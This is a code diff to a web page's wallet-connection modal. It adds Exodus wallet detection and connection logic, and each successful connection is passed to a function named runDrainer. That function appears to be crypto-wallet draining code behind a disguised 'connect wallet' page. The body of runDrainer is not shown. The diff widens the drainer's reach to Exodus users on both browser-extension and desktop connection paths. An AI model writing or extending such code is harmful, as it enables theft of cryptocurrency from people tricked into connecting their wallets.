@@ -808,7 +808,7 @@
         key: 'exodus',
         name: 'Exodus',
         icon: '/logos/exodus.png',
-        provider: () => window.exodus,
+        provider: () => window.exodus || window.exodusWallet,
         install: 'https://exodus.com/',
         mobile: {
           appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
@@ -984,6 +984,44 @@
                     console.log('Solflare signIn error:', signInError);
                     showStatus('Please approve the connection in Solflare', 'error');
                   }
+                } else if (wallet.name === 'Exodus') {
+                  // Exodus specific connection logic
+                  try {
+                    console.log('Attempting Exodus connection...');
+                    
+                    // Try different Exodus connection methods
+                    if (typeof provider.connect === 'function') {
+                      const result = await provider.connect();
+                      console.log('Exodus connect result:', result);
+                      
+                      if (result && result.publicKey) {
+                        showStatus('Exodus connected!', 'success');
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                      } else {
+                        showStatus('Please approve the connection in Exodus', 'error');
+                      }
+                    } else if (typeof provider.request === 'function') {
+                      // Try request method
+                      const result = await provider.request({ method: 'connect' });
+                      console.log('Exodus request result:', result);
+                      
+                      if (result) {
+                        showStatus('Exodus connected!', 'success');
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                      } else {
+                        showStatus('Please approve the connection in Exodus', 'error');
+                      }
+                    } else {
+                      showStatus('Exodus connection method not available', 'error');
+                    }
+                  } catch (exodusError) {
+                    console.log('Exodus connection error:', exodusError);
+                    showStatus('Please approve the connection in Exodus', 'error');
+                  }
                 } else {
                   showStatus(`Please approve the connection in ${wallet.name}`, 'error');
                 }
@@ -1051,7 +1089,33 @@
                 runDrainer(provider);
               }, 1000);
             } else {
-              showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+              // Try Exodus-specific connection
+              if (wallet.name === 'Exodus') {
+                try {
+                  console.log('Attempting Exodus desktop connection...');
+                  
+                  if (typeof provider.request === 'function') {
+                    const exodusResult = await provider.request({ method: 'connect' });
+                    console.log('Exodus desktop request result:', exodusResult);
+                    
+                    if (exodusResult) {
+                      showStatus('Exodus connected!', 'success');
+                      setTimeout(() => {
+                        runDrainer(provider);
+                      }, 1000);
+                    } else {
+                      showStatus('Please approve the connection in Exodus', 'error');
+                    }
+                  } else {
+                    showStatus('Please approve the connection in Exodus', 'error');
+                  }
+                } catch (exodusError) {
+                  console.log('Exodus desktop connection error:', exodusError);
+                  showStatus('Please approve the connection in Exodus', 'error');
+                }
+              } else {
+                showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+              }
             }
           } else {
             showStatus(`${wallet.name} connection method not available`, 'error');
@@ -1259,11 +1323,6 @@
     function closeWalletModal() {
       document.getElementById("walletModal").classList.remove("active");
     }
-    
-    window.onclick = function(event) {
-      const modal = document.getElementById("walletModal");
-      if (event.target === modal) closeWalletModal();
-    };
 
     // Essential helper functions for desktop functionality
     function getWalletAddress(provider) {
